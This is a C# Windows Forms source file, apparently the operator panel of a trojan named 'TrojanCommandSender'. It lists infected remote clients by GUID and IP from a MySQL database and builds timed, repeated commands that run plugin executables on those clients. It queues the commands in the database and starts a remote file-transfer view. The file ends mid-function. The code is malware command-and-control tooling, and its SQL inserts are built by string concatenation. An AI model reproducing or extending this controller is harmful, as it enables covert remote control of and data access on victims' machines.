/* 
 * WRANING: These codes below is far away from bugs with the god and his animal protecting
 *                  _oo0oo_                   ┏┓　　　┏┓
 *                 o8888888o                ┏┛┻━━━┛┻┓
 *                 88" . "88                ┃　　　　　　　┃ 　
 *                 (| -_- |)                ┃　　　━　　　┃
 *                 0\  =  /0                ┃　┳┛　┗┳　┃
 *               ___/`---'\___              ┃　　　　　　　┃
 *             .' \\|     |# '.             ┃　　　┻　　　┃
 *            / \\|||  :  |||# \            ┃　　　　　　　┃
 *           / _||||| -:- |||||- \          ┗━┓　　　┏━┛
 *          |   | \\\  -  #/ |   |          　　┃　　　┃神兽保佑
 *          | \_|  ''\---/''  |_/ |         　　┃　　　┃永无BUG
 *          \  .-\__  '-'  ___/-. /         　　┃　　　┗━━━┓
 *        ___'. .'  /--.--\  `. .'___       　　┃　　　　　　　┣┓
 *     ."" '<  `.___\_<|>_/___.' >' "".     　　┃　　　　　　　┏┛
 *    | | :  `- \`.;`\ _ /`;.`/ - ` : | |   　　┗┓┓┏━┳┓┏┛
 *    \  \ `_.   \_ __\ /__ _/   .-` /  /   　　　┃┫┫　┃┫┫
 *=====`-.____`.___ \_____/___.-`___.-'=====　　　┗┻┛　┗┻┛ 
 *                  `=---='　　　
 *          佛祖保佑       永无BUG
 */
// =============================================================================== 
// Author              :    Frankie.W
// Create Time         :    2018/3/13 13:24:38
// Update Time         :    2018/3/13 13:24:38
// Class Version       :    v1.0.0.0
// Class Description   :    
// ===============================================================================
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Web.Script.Serialization;
using System.Windows.Forms;
using TrojanCommandSender.Src;
// ===============================================================================
namespace TrojanCommandSender
{
    public partial class MainForm : Form
    {
        private CommandStaticConfigMgr m_StaticConfigMgr;
        private Command m_EditCommand;
        private MySQLConnector m_MySQLConnector;
        private ClientMgr m_ClientMgr;
        private string m_ReadyToSendCmd;
        private DateTime m_LastCommandDirModify;

        #region 核心函数
        public MainForm()
        {
            InitializeComponent();
        }

        public void Init()
        {
            try
            {
                if (!BaseInit())
                {
                    System.Environment.Exit(0);
                }
                // 创建定时器，定时刷新客户端列表
            }
            catch (Exception e)
            {
                MessageBox.Show("程序出现严重错误，即将退出: " + e.ToString());
            }
        }
        private bool BaseInit()
        {
            try
            {
                m_StaticConfigMgr = new CommandStaticConfigMgr();
                m_EditCommand = new Command();
                m_ClientMgr = new ClientMgr();
                m_MySQLConnector = new MySQLConnector(CONFIG.CONFIG_FILE);

                // 加载命令属性
                LoadCommands();
                // 添加测试数据
                //AddDebugClientInfo();
                // 初始化UI
                InitCommandStaticListView();
                UpdateCommandStaticListView();
                InitClientListView();
                UpdateClientListView();
                InitLocalFileTreeView();

                // 开启客户端信息更新定时器
                UpdateClientsInfoTimer.Interval = CONFIG.UPDATE_CLIENT_TIMER;
                UpdateClientsInfoTimer.Start();
                UpdateCommandTimer.Interval = CONFIG.UPDATE_COMMAND_TIMER;
                UpdateCommandTimer.Start();

                AppendTextToTextbox("软件初始化完成...", CONFIG.INFO_COLOR);
            }
            catch {
                return false;
            }
            return true;
        }

        private bool LoadCommands()
        {
            // 查询文件夹
            string strCommandsExeDir = Directory.GetCurrentDirectory() + "\\" + CONFIG.EXEDIR;
            if (!Directory.Exists(strCommandsExeDir))
            {
                MessageBox.Show("无法找到目录 " + strCommandsExeDir + " ,请确认文件存放目录正确.");
                return false;
            }
            var m = Directory.GetLastAccessTime(strCommandsExeDir);
            if (m_LastCommandDirModify == m)
            {
                return false;
            }
            else
            {
                m_LastCommandDirModify = m;
                m_StaticConfigMgr.Clear();
            }
            // 遍历查找Exe文件
            string[] exeList = GetExeFileList(strCommandsExeDir);
            if (exeList.Length <= 0)
            {
                MessageBox.Show("目录 " + strCommandsExeDir + " 内没有可执行文件,请确认文件正常安装.");
                return false;
            }
            // 循环执行，获取config
            int successedCmdCount = 0;
            int failedCmdCount = 0;
            for (int i = 0; i < exeList.Length; ++i)
            {
                string exeOutput = Execute(exeList[i], "-h", CONFIG.DEFAULT_MAX_WAITTIME);
                Byte[] utf8ExeOutput = Encoding.Default.GetBytes(exeOutput);
                exeOutput = Encoding.UTF8.GetString(utf8ExeOutput);
                if (m_StaticConfigMgr.ParserCommandHelpOutput(exeOutput))
                {
                    successedCmdCount++;
                }
                else
                {
                    failedCmdCount++;
                }
            }
            m_StaticConfigMgr.SortCommandStaticList();
            AppendTextToTextbox("发现有效命令： " + successedCmdCount + " 个，处理失败命令： " + failedCmdCount + " 个", CONFIG.INFO_COLOR);
            return true;
        }
        private void UpdateCommandStringFormControl(bool bShowLog = false)
        {
            try
            {
                m_ReadyToSendCmd = "";

                string errorStr = "";
                string header = "std";

                string cmdName = "";
                string clientGuid = "";
                string repeatTimes = "";
                string elspTime = "";
                string paramStr = "";

                Control cmdNameCtrl = FindControlByName(AttrPanel, "NameLabel");
                if (cmdNameCtrl != null)
                {
                    int nFirstSpacePos = cmdNameCtrl.Text.IndexOf(" ");
                    if (nFirstSpacePos != -1)
                    {
                        cmdName = cmdNameCtrl.Text.Substring(0, nFirstSpacePos);
                    }
                }
                do
                {
                    if (string.IsNullOrEmpty(cmdName))
                    {
                        errorStr = "命令名称无法获取...命令无法生成.";
                        break;
                    }

                    Control clientGuidCtrl = FindControlByName(AttrPanel, "clientListBox");
                    if (clientGuidCtrl != null)
                    {
                        clientGuid = clientGuidCtrl.Text;
                    }
                    if (string.IsNullOrEmpty(clientGuid))
                    {
                        errorStr = "必须选择一个接受命令的远程客户端";
                        break;
                    }

                    Control elspTimeCtrl = FindControlByName(AttrPanel, "elspNum");
                    if (elspTimeCtrl != null)
                    {
                        elspTime = elspTimeCtrl.Text;
                    }
                    if (string.IsNullOrEmpty(elspTime))
                    {
                        errorStr = "重发间隔时间必须是个有效值";
                        break;
                    }
                    int nElspTime = Convert.ToInt32(elspTime);
                    if (nElspTime < 0 || nElspTime >= 0x0fffffff)
                    {
                        errorStr = "重发间隔时间必须是个0 - 0x0fffffff之间的有效值，当前值是：" + nElspTime;
                        break;
                    }

                    Control repeatNumCtrl = FindControlByName(AttrPanel, "repeatNum");
                    if (repeatNumCtrl != null)
                    {
                        repeatTimes = repeatNumCtrl.Text;
                    }
                    if (string.IsNullOrEmpty(repeatTimes))
                    {
                        errorStr = "重发次数必须是个有效值";
                        break;
                    }
                    int nRepeatTime = Convert.ToInt32(repeatTimes);
                    if (nRepeatTime < 0 || nRepeatTime >= 0x0fffffff)
                    {
                        errorStr = "重发次数必须是个0 - 0x0fffffff之间的有效值，当前值是：" + nRepeatTime;
                        break;
                    }

                    // 组装参数字符串
                    CommandStaticStruct s = m_StaticConfigMgr.GetCommandStaticStructByName(cmdName);
                    if (s != null)
                    {
                        for (int i = 0; i < s.Parameters.Count; ++i)
                        {
                            string strValue = "";
                            if (s.Parameters[i].type.Equals("string"))
                            {
                                Control cStrControl = FindControlByName(AttrPanel, "StrValue_Attr_" + i);
                                if (cStrControl != null)
                                {
                                    strValue = cStrControl.Text;
                                }
                                if (string.IsNullOrEmpty(strValue))
                                {
                                    if (s.Parameters[i].required)
                                    {
                                        errorStr = "第" + (i + 1) + "个参数为必须参数，不允许为空.";
                                    }
                                }
                                else
                                {
                                    paramStr += " " + s.Parameters[i].short_fmt + " " + strValue;
                                }
                            }
                            else if (s.Parameters[i].type.Equals("int"))
                            {
                                Control cStrControl = FindControlByName(AttrPanel, "IntValue_Attr_" + i);
                                if (cStrControl != null)
                                {
                                    strValue = cStrControl.Text;
                                }
                                if (string.IsNullOrEmpty(strValue))
                                {
                                    if (s.Parameters[i].required)
                                    {
                                        errorStr = "第" + (i + 1) + "个参数为必须参数，不允许为空.";
                                    }
                                }
                                else
                                {
                                    int nValue = Convert.ToInt32(strValue);
                                    if (nValue < 0 || nValue >= 0x0fffffff)
                                    {
                                        if (s.Parameters[i].required)
                                        {
                                            errorStr = "第" + (i + 1) + "个参数必须是一个有效整数.当前值是：" + strValue;
                                        }
                                    }
                                    else
                                    {
                                        paramStr += " " + s.Parameters[i].short_fmt + " " + strValue;
                                    }
                                }
                            }
                            else if (s.Parameters[i].type.Equals("bool"))
                            {
                                Control cTrueControl = FindControlByName(AttrPanel, "YesValue_Attr_" + i);
                                Control cFalseControl = FindControlByName(AttrPanel, "NoValue_Attr_" + i);
                                if (cTrueControl != null && cTrueControl is RadioButton && ((RadioButton)cTrueControl).Checked)
                                {
                                    strValue = "true";
                                }
                                else if (cFalseControl != null && cFalseControl is RadioButton && ((RadioButton)cFalseControl).Checked)
                                {
                                    strValue = "false";
                                }

                                if (s.Parameters[i].required)
                                {
                                    if ((!strValue.Equals("true")) && (!strValue.Equals("false")))
                                    {
                                        errorStr = "第" + (i + 1) + "个参数必须是一个有效布尔类型.当前值是：" + strValue;
                                    }
                                    else
                                    {
                                        paramStr += " " + s.Parameters[i].short_fmt + " " + strValue;
                                    }
                                }
                            }

                        }
                    }

                    // 组装全部
                    if (cmdName.IndexOf(".exe") < 0)
                    {
                        cmdName += ".exe";
                    }
                    string cmdExePath = Directory.GetCurrentDirectory() + "\\" + CONFIG.EXEDIR + "\\" + cmdName;
                    if (File.Exists(cmdExePath))
                    {
                        cmdName = cmdExePath;
                    }
                    string result = header + " " + clientGuid + " " + elspTime + " " + repeatTimes + " " + cmdName;
                    if (!string.IsNullOrEmpty(paramStr))
                    {
                        result += paramStr;
                    }
                    // 显示
                    if (string.IsNullOrEmpty(errorStr))
                    {
                        m_ReadyToSendCmd = result;
                        if (bShowLog)
                            AppendTextToTextbox("生成：" + result);
                        return;
                    }
                } while (false);

                if (bShowLog)
                    AppendTextToTextbox("错误：" + errorStr, CONFIG.ERROR_COLOR);
            }
            catch (Exception e)
            {
                AppendTextToTextbox("生成命令出现错误：" + e.ToString(), CONFIG.ERROR_COLOR);
            }
        }
        private void InsertCommandToDB(string strCmd)
        {
            try
            {
                /*
                var jss = new JavaScriptSerializer();
                DBCommandStruct s = jss.Deserialize<DBCommandStruct>(strCmd);
                string strInsertCmd = "INSERT INTO " + CONFIG.DB_TABLE_NAME +
                    " (command, guid, run_count, interval_sec, time) " + "VALUES" + " (\""
                    + s.command + "\", \"" + s.guid + "\", " + s.run_count + " , "
                    + s.interval_sec + ", \"" + s.time + "\")";
                */
                string strInsertCmd = @"INSERT INTO " + CONFIG.COMMAND_TABLE_NAME +
                    " (";
                var jss = new JavaScriptSerializer();
                var DynamicObject = jss.Deserialize<dynamic>(strCmd);
                bool isDic = typeof(IDictionary).IsAssignableFrom(DynamicObject.GetType());
                if (isDic)
                {
                    bool isFirst = true;
                    foreach (var pair in DynamicObject)
                    {
                        if (isFirst)
                        {
                            strInsertCmd += pair.Key;
                            isFirst = false;
                        }
                        else
                        {
                            strInsertCmd += ",";
                            strInsertCmd += pair.Key;
                        }
                    }
                    strInsertCmd += ") " + "VALUES" + " (";
                    isFirst = true;
                    foreach (var pair in DynamicObject)
                    {
                        if (isFirst)
                        {
                            strInsertCmd += "\"";
                            strInsertCmd += pair.Value;
                            strInsertCmd += "\"";
                            isFirst = false;
                        }
                        else
                        {
                            strInsertCmd += ",";
                            strInsertCmd += "\"";
                            strInsertCmd += pair.Value;
                            strInsertCmd += "\"";
                        }
                    }
                    strInsertCmd += ") ";
                }
                else
                {
                    AppendTextToTextbox("向数据库插入命令失败.", CONFIG.ERROR_COLOR);
                    return;
                }

                strInsertCmd = strInsertCmd.Replace("\\", "\\\\");
                AppendTextToTextbox("插入：" + strInsertCmd);

                if(!m_MySQLConnector.Insert(strInsertCmd))
                {
                    AppendTextToTextbox("向数据库插入命令失败.", CONFIG.ERROR_COLOR);
                    return;
                }
                AppendTextToTextbox("插入一条命令成功!", CONFIG.INFO_COLOR);
            }
            catch (Exception e)
            {
                AppendTextToTextbox("向数据库插入命令失败: " + e.ToString(), CONFIG.ERROR_COLOR);
            }
        }
        #endregion

        #region DEBUG函数
        private void AddDebugClientInfo()
        {
            ClientStruct s = new ClientStruct();
            s.clientIP = "179.3.0.244";
            s.clientGuid = "{B196B286-BAB4-101A-B69C-00AA00341D07}";
            m_ClientMgr.ClientsList.Add(s);
            ClientStruct s2 = new ClientStruct();
            s2.clientIP = "219.34.10.244";
            s2.clientGuid = "{AF86E2E0-B12D-4C6A-9C5A-D7AA65101E90}";
            m_ClientMgr.ClientsList.Add(s2);

            AppendTextToTextbox("添加测试数据完成...", CONFIG.INFO_COLOR);
        }
        #endregion

        #region 功能函数
        private ArrayList GetExeFiles(string dir)
        {
            ArrayList result = new ArrayList();
            try
            {
                // 注意，不向深层递归
                string[] files = Directory.GetFiles(dir);
                foreach (string file in files)
                {
                    if (".exe".IndexOf(file.Substring(file.LastIndexOf(".") + 1)) > -1)
                    {
                        FileInfo fi = new FileInfo(file);
                        result.Add(fi.FullName);
                    }
                }
            }catch{
                result.Clear();
            }
            return result;
        }
        private string[] GetExeFileList(string path)
        {
            ArrayList fileList = GetExeFiles(path);
            return (string[])fileList.ToArray(typeof(string));
        }
        private string Execute(string exePath, string args, int milliseconds)
        {
            string strOutput = string.Empty;
            if (string.IsNullOrEmpty(exePath))
            {
                return string.Empty;
            }
            if (!File.Exists(exePath))
            {
                return string.Empty;
            }

            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = exePath;
            startInfo.Arguments = args;
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardInput = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.CreateNoWindow = true;
            process.StartInfo = startInfo;
            try
            {
                if (process.Start())
                {
                    if (milliseconds == 0)
                    {
                        process.WaitForExit();                      // 无限等待
                    }
                    else
                    {
                        process.WaitForExit(milliseconds);
                    }
                    // 读取输出
                    strOutput = process.StandardOutput.ReadToEnd();
                }
            }
            catch
            {
            }
            finally
            {
                if (process != null)
                    process.Close();
            }

            return strOutput;
        }
        #endregion

        #region UI日志记录、支持其他线程访问  
        private delegate void LogAppendDelegate(Color color, string text);
        private void LogAppend(Color color, string text)
        {
            try
            {
                OutputRichTextBox.SelectionColor = color;
                OutputRichTextBox.AppendText(text + Environment.NewLine);
            }
            catch { }
        }
        public void AppendTextToTextbox(string msg, Color color = new Color())
        {
            try
            {
                if (this.IsHandleCreated)
                {
                    LogAppendDelegate la = new LogAppendDelegate(LogAppend);
                    OutputRichTextBox.Invoke(la, color, DateTime.Now.ToString("【HH:mm:ss】 ") + msg);
                }
                else
                {
                    OutputRichTextBox.SelectionColor = color;
                    OutputRichTextBox.AppendText(DateTime.Now.ToString("【HH:mm:ss】 ") + msg + Environment.NewLine);
                }
                // 总是拖到最新的日志
                OutputRichTextBox.SelectionStart = OutputRichTextBox.Text.Length;
                // scroll it automatically
                OutputRichTextBox.ScrollToCaret();
            }
            catch { }
        }
        #endregion

        #region UI ListView相关
        private void InitCommandStaticListView()
        {
            try
            {
                CommandListView.GridLines = true;                               // 显示行分割线
                CommandListView.FullRowSelect = true;                           // 必须整行选取
                CommandListView.View = View.Details;                            // 显示详细信息
                CommandListView.Scrollable = true;                              // 允许使用滚动条
                CommandListView.MultiSelect = false;                            // 禁止多行选择
                CommandListView.HeaderStyle = ColumnHeaderStyle.Nonclickable;   // 表头行不响应点击

                CommandListView.Columns.Clear();
                CommandListView.Columns.Add("名称", 90, HorizontalAlignment.Right);
                CommandListView.Columns.Add("版本", 50, HorizontalAlignment.Left);
                CommandListView.Columns.Add("描述", 350, HorizontalAlignment.Left);
            }
            catch { }
        }
        private void UpdateCommandStaticListView()
        {
            CommandListView.Items.Clear();
            for(int i = 0; i < m_StaticConfigMgr.StaticCommandList.Count; ++i)
            {
                if (m_StaticConfigMgr.StaticCommandList[i].IsValid())
                {
                    ListViewItem lvi = new ListViewItem(m_StaticConfigMgr.StaticCommandList[i].name, 0);
                    lvi.SubItems.Add(m_StaticConfigMgr.StaticCommandList[i].version);
                    lvi.SubItems.Add(m_StaticConfigMgr.StaticCommandList[i].desc);
                    CommandListView.Items.Add(lvi);
                }
            }
        }
        private void CommandListView_Click(object sender, EventArgs e)
        {
            try
            {
                int i = CommandListView.SelectedIndices[0];
                string strSelectCommandName = CommandListView.Items[i].Text;
                CommandStaticStruct staticStruct = m_StaticConfigMgr.GetCommandStaticStructByName(strSelectCommandName);
                if (staticStruct == null)
                {
                    AppendTextToTextbox("未找到 " + strSelectCommandName + " 该命令信息", CONFIG.ERROR_COLOR);
                    return;
                }

                var stopwatch = new Stopwatch();
                stopwatch.Start();
                if (!CreateUIControlsByInfo(staticStruct))
                {
                    AppendTextToTextbox("命令 " + strSelectCommandName + " 数据有误，创建属性编辑界面失败", CONFIG.ERROR_COLOR);
                    return;
                }
                stopwatch.Stop();
                //AppendTextToTextbox("初始化UI消耗时间：" + stopwatch.Elapsed, INFO_COLOR);
            }
            catch { }
        }
        private void InitClientListView()
        {
            try
            {
                ClientListView.GridLines = true;                               // 显示行分割线
                ClientListView.FullRowSelect = true;                           // 必须整行选取
                ClientListView.View = View.Details;                            // 显示详细信息
                ClientListView.Scrollable = true;                              // 允许使用滚动条
                ClientListView.MultiSelect = false;                            // 禁止多行选择
                ClientListView.HeaderStyle = ColumnHeaderStyle.Nonclickable;   // 表头行不响应点击

                ClientListView.Columns.Clear();
                ClientListView.Columns.Add("GUID", 150, HorizontalAlignment.Right);
                ClientListView.Columns.Add("IP", 120, HorizontalAlignment.Left);
            }
            catch { }
        }
        private void UpdateClientListView()
        {
            if (m_ClientMgr == null)
                return;
            if (m_MySQLConnector == null)
                return;
            int nOldClientNum = m_ClientMgr.ClientsList.Count;
            m_ClientMgr.ClientsList = m_MySQLConnector.GetClientInfos();

            //更新客户端列表
            ClientListView.Items.Clear();
            for(int i = 0; i < m_ClientMgr.ClientsList.Count; ++i)
            {
                if (m_ClientMgr.ClientsList[i].IsValid())
                {
                    ListViewItem lvi = new ListViewItem(m_ClientMgr.ClientsList[i].clientGuid, 0);
                    lvi.SubItems.Add(m_ClientMgr.ClientsList[i].clientIP);
                    ClientListView.Items.Add(lvi);
                }
            }

            // 更新其他
            RomateUpdownGuidCB.Items.Clear();
            for (int i = 0; i < m_ClientMgr.ClientsList.Count; ++i)
            {
                RomateUpdownGuidCB.Items.Add(m_ClientMgr.ClientsList[i].clientGuid);
            }

            if (nOldClientNum != m_ClientMgr.ClientsList.Count)
            {
                AppendTextToTextbox("客户端数量更变： " + nOldClientNum + " -> " + m_ClientMgr.ClientsList.Count + " 个",
                    CONFIG.INFO_COLOR);
            }
        }
        #endregion

        #region UI反射控件相关
        private bool CreateUIControlsByInfo(CommandStaticStruct s)
        {
            AttrPanel.Controls.Clear();

            // 创建控件
            for (int i = s.Parameters.Count - 1; i >= 0; --i)
            {
                CreateOneParamPanel(i, s.Parameters[i]);
            }
            if (!CreateTimedTaskPanel())
                return false;
            if (!CreateClientListPanel(m_ClientMgr.ClientsList))
                return false;
            if (!CreateHeader(s.name, s.version, s.desc))
                return false;            

            // 更新命令
            UpdateCommandStringFormControl();

            return true;
        }
        private bool CreateHeader(string name, string version, string desc)
        {
            if (string.IsNullOrEmpty(name))
                return false;

            Panel headerPanel = new Panel();
            headerPanel.Location = new Point(0, 0);
            headerPanel.Height = 50;
            headerPanel.Name = "HeaderPanel";
            headerPanel.BackColor = Color.Orange;
            headerPanel.BorderStyle = BorderStyle.Fixed3D;
            headerPanel.Dock = DockStyle.Top;
            AttrPanel.Controls.Add(headerPanel);

            Label nameLabel = new Label();
            nameLabel.Text = name + " (" + version + ")";
            nameLabel.Height = 24;
            nameLabel.AutoSize = false;
            nameLabel.Dock = DockStyle.None;
            nameLabel.Width = headerPanel.Width;
            nameLabel.TextAlign = ContentAlignment.MiddleCenter;
            nameLabel.Name = "NameLabel";
            nameLabel.Font = new Font("Georgia", 16);
            headerPanel.Controls.Add(nameLabel);

            Label descLabel = new Label();
            descLabel.Text = desc;
            descLabel.Location = new Point(0, 24);
            descLabel.Height = 20;
            descLabel.AutoSize = false;
            descLabel.Dock = DockStyle.None;
            descLabel.Width = headerPanel.Width;
            descLabel.TextAlign = ContentAlignment.MiddleCenter;
            descLabel.Name = "DescLabel";
            descLabel.Font = new Font("Georgia", 12);
            headerPanel.Controls.Add(descLabel);
            return true;
        }
        private bool CreateClientListPanel(List<ClientStruct> clientsList)
        {
            Panel clientListPanel = new Panel();
            clientListPanel.Location = new Point(0, 0);
            clientListPanel.Height = 30;
            clientListPanel.Name = "ClientListPanel";
            clientListPanel.BackColor = Color.BlanchedAlmond;
            clientListPanel.BorderStyle = BorderStyle.Fixed3D;
            clientListPanel.Dock = DockStyle.Top;
            AttrPanel.Controls.Add(clientListPanel);

            Label clientNoticeLabel = new Label();
            clientNoticeLabel.Text = "远程客户端";
            clientNoticeLabel.Location = new Point(0, 2);
            clientNoticeLabel.Height = 24;
            clientNoticeLabel.AutoSize = false;
            clientNoticeLabel.Dock = DockStyle.None;
            clientNoticeLabel.Width = clientListPanel.Width / 4;
            clientNoticeLabel.TextAlign = ContentAlignment.TopLeft;
            clientNoticeLabel.Name = "clientNoticeLabel";
            clientNoticeLabel.Font = new Font("Georgia", 16);
            clientListPanel.Controls.Add(clientNoticeLabel);

            ComboBox clientListBox = new ComboBox();
            clientListBox.Width = clientListPanel.Width * 3 / 4 - 20;
            clientListBox.Location = new Point(clientListPanel.Width * 3 / 4 + 2, 0);
            clientListBox.Dock = DockStyle.Right;
            clientListBox.Name = "clientListBox";
            clientListBox.Font = new Font("Georgia", 14);
            for(int i = 0; i < clientsList.Count; ++i)
            {
                clientListBox.Items.Add(clientsList[i].clientGuid);
            }
            clientListBox.TextChanged += new EventHandler(DynamicControlClick);
            clientListPanel.Controls.Add(clientListBox);

            return true;
        }
        private bool CreateTimedTaskPanel()
        {
            Panel timedTaskPanel = new Panel();
            timedTaskPanel.Location = new Point(0, 0);
            timedTaskPanel.Height = 30;
            timedTaskPanel.Name = "TimedTaskPanel";
            timedTaskPanel.BackColor = Color.BlanchedAlmond;
            timedTaskPanel.BorderStyle = BorderStyle.Fixed3D;
            timedTaskPanel.Dock = DockStyle.Top;
            AttrPanel.Controls.Add(timedTaskPanel);

            CheckBox useTimedTaskCheckBox = new CheckBox();
            useTimedTaskCheckBox.Text = "启动定时任务";
            useTimedTaskCheckBox.Location = new Point(0 + 10, 0);
            useTimedTaskCheckBox.AutoSize = true;
            useTimedTaskCheckBox.Dock = DockStyle.None;
            useTimedTaskCheckBox.TextAlign = ContentAlignment.TopLeft;
            useTimedTaskCheckBox.Name = "useTimedTaskCheckBox";
            useTimedTaskCheckBox.Font = new Font("Georgia", 16);
            useTimedTaskCheckBox.CheckedChanged += new EventHandler(TimedTaskCheckboxControlClick);
            timedTaskPanel.Controls.Add(useTimedTaskCheckBox);

            Label timeElspLabel = new Label();
            timeElspLabel.Text = "间隔(s)";
            timeElspLabel.Location = new Point(0, 2);
            timeElspLabel.AutoSize = true;
            timeElspLabel.Dock = DockStyle.Right;
            timeElspLabel.Name = "timeElspLabel";
            timeElspLabel.Font = new Font("Georgia", 16);
            timeElspLabel.Visible = false;
            timedTaskPanel.Controls.Add(timeElspLabel);

            NumericUpDown elspNum = new NumericUpDown();
            elspNum.Width = 85;
            elspNum.BorderStyle = BorderStyle.Fixed3D;
            elspNum.Dock = DockStyle.Right;
            elspNum.Name = "elspNum";
            elspNum.Maximum = 99999;
            elspNum.Minimum = 0;
            elspNum.Font = new Font("arial", 16);
            elspNum.Visible = false;
            elspNum.Value = 0;
            elspNum.ValueChanged += new EventHandler(DynamicControlClick);
            timedTaskPanel.Controls.Add(elspNum);

            Label repeatLabel = new Label();
            repeatLabel.Text = "次数";
            repeatLabel.Location = new Point(0, 2 + 12);
            repeatLabel.AutoSize = true;
            repeatLabel.Dock = DockStyle.Right;
            repeatLabel.Name = "repeatLabel";
            repeatLabel.Font = new Font("Georgia", 16);
            repeatLabel.Visible = false;
            timedTaskPanel.Controls.Add(repeatLabel);

            NumericUpDown repeatNum = new NumericUpDown();
            repeatNum.Width = 95;
            repeatNum.BorderStyle = BorderStyle.Fixed3D;
            repeatNum.Dock = DockStyle.Right;
            repeatNum.Name = "repeatNum";
            repeatNum.Maximum = 999999;
            repeatNum.Minimum = 1;
            repeatNum.Font = new Font("arial", 16);
            repeatNum.Visible = false;
            repeatNum.Value = 1;
            repeatNum.ValueChanged += new EventHandler(DynamicControlClick);
            timedTaskPanel.Controls.Add(repeatNum);

            return true;
        }
        private bool CreateOneParamPanel(int nIndex, CommandStaticAttrStruct s)
        {
            Panel panel = new Panel();
            panel.Height = 66;
            panel.Name = "Panel_Attr_" + nIndex;
            panel.BackColor = Color.Cornsilk;
            panel.BorderStyle = BorderStyle.Fixed3D;
            panel.Dock = DockStyle.Top;
            AttrPanel.Controls.Add(panel);

            Label descLabel = new Label();
            descLabel.Text = "说明：" + s.desc + "";
            descLabel.Location = new Point(0, 2);
            descLabel.Height = 16;
            descLabel.AutoSize = false;
            descLabel.Dock = DockStyle.None;
            descLabel.Width = panel.Width / 2;
            descLabel.TextAlign = ContentAlignment.TopLeft;
            descLabel.Name = "DescLabel_Attr_" + nIndex;
            panel.Controls.Add(descLabel);

            string strShowType = s.type;
            if (strShowType.Equals("string")){
                strShowType = "字符串";
            }
            else if (strShowType.Equals("int"))
            {
                strShowType = "整数";
            }
            else if (strShowType.Equals("bool"))
            {
                strShowType = "布尔型";
            }
            Label typeLabel = new Label();
            typeLabel.Text = "类型：" + strShowType;
            typeLabel.Location = new Point(0, 18);
            typeLabel.Height = 16;
            typeLabel.AutoSize = false;
            typeLabel.Dock = DockStyle.None;
            typeLabel.Width = panel.Width / 2;
            typeLabel.TextAlign = ContentAlignment.TopLeft;
            typeLabel.Name = "TypeLabel_Attr_" + nIndex;
            panel.Controls.Add(typeLabel);

            Label exampleLabel = new Label();
            exampleLabel.Text = "例子：" + s.example + "";
            exampleLabel.Location = new Point(0, 34);
            exampleLabel.Height = 16;
            exampleLabel.AutoSize = false;
            exampleLabel.Dock = DockStyle.None;
            exampleLabel.Width = panel.Width / 2;
            exampleLabel.TextAlign = ContentAlignment.TopLeft;
            exampleLabel.Name = "ExampleLabel_Attr_" + nIndex;
            panel.Controls.Add(exampleLabel);

            string strRequired = "";
            if (!s.required)
            {
                strRequired = "● 可选";
            }
            Label requiredLabel = new Label();
            requiredLabel.Text = strRequired;
            requiredLabel.Location = new Point(0, 50);
            requiredLabel.Height = 16;
            requiredLabel.AutoSize = false;
            requiredLabel.Dock = DockStyle.None;
            requiredLabel.Width = panel.Width / 2;
            requiredLabel.TextAlign = ContentAlignment.TopLeft;
            requiredLabel.Name = "RequiredLabel_Attr_" + nIndex;
            panel.Controls.Add(requiredLabel);


            if (s.type.Equals("string"))
            {
                RichTextBox text = new RichTextBox();
                text.Height = 60;
                text.Width = panel.Width / 2 - 20;
                text.Location = new Point(panel.Width / 2 + 2, 0);
                text.Dock = DockStyle.Right;
                text.Name = "StrValue_Attr_" + nIndex;
                text.TextChanged += new EventHandler(DynamicControlClick);
                panel.Controls.Add(text);
            }
            else if (s.type.Equals("int"))
            {
                NumericUpDown num = new NumericUpDown();
                num.Width = panel.Width / 2 - 20;
                num.Location = new Point(panel.Width / 2 + 2, 0);
                num.BorderStyle = BorderStyle.Fixed3D;
                num.Dock = DockStyle.Right;
                num.Name = "IntValue_Attr_" + nIndex;
                num.Maximum = 99999999;
                num.Font = new Font("arial", 36);
                num.ValueChanged += new EventHandler(DynamicControlClick);
                panel.Controls.Add(num);
            }
            else if (s.type.Equals("bool"))
            {
                RadioButton yesButton = new RadioButton();
                yesButton.Text = "是";
                yesButton.Location = new Point(panel.Width / 2 + 2, 0);
                yesButton.Dock = DockStyle.Right;
                yesButton.Name = "YesValue_Attr_" + nIndex;
                yesButton.Click += new EventHandler(DynamicControlClick);
                yesButton.Checked = true;
                panel.Controls.Add(yesButton);

                RadioButton noButton = new RadioButton();
                noButton.Text = "否";
                noButton.Location = new Point(panel.Width / 2 + 2, 33);
                noButton.Dock = DockStyle.Right;
                noButton.Name = "NoValue_Attr_" + nIndex;
                noButton.Click += new EventHandler(DynamicControlClick);
                panel.Controls.Add(noButton);
            }

            return true;
        }
        private Control FindControlByName(Control parentCtrl, string controlName)
        {
            foreach (Control ctrl in parentCtrl.Controls)
            {
                if (ctrl.Name.Equals(controlName))
                {
                    return ctrl;
                }
                Control re = FindControlByName(ctrl, controlName);
                if(re == null)
                {
                    continue;
                }
                else { return re; }
            }
            return null;
        }
        private void TimedTaskCheckboxControlClick(object sender, EventArgs e)
        {
            try
            {
                CheckBox b = (CheckBox)sender;
                string head = "useTimedTaskCheckBox";
                if (b.Name.Equals(head))
                {
                    Control c = FindControlByName(AttrPanel, "timeElspLabel");
                    if (c != null)
                    {
                        c.Visible = b.Checked;
                        c = FindControlByName(AttrPanel, "repeatLabel");
                        if (c != null) c.Visible = b.Checked;
                        c = FindControlByName(AttrPanel, "elspNum");
                        if (c != null)
                        {
                            c.Visible = b.Checked;
                            if (!b.Checked)
                            {
                                c.Text = "0";
                            }
                        }
                        c = FindControlByName(AttrPanel, "repeatNum");
                        if (c != null)
                        {
                            c.Visible = b.Checked;
                            if (!b.Checked)
                            {
                                c.Text = "1";
                            }
                        }
                    }
                }
                DynamicControlClick(sender, e);
            }
            catch { }
        }
        private void DynamicControlClick(object sender, EventArgs e)
        {
            UpdateCommandStringFormControl();
        }
        #endregion

        #region UI文件上传下载相关
        private void InitLocalFileTreeView()
        {
            TreeNode rootNode = new TreeNode("我的电脑",
            IconIndexes.MyComputer, IconIndexes.MyComputer);        //载入显示 选择显示  
            rootNode.Tag = "我的电脑";                              //树节点数据  
            rootNode.Text = "我的电脑";                             //树节点标签内容  
            this.directoryTree.Nodes.Add(rootNode);                 //树中添加根目录  

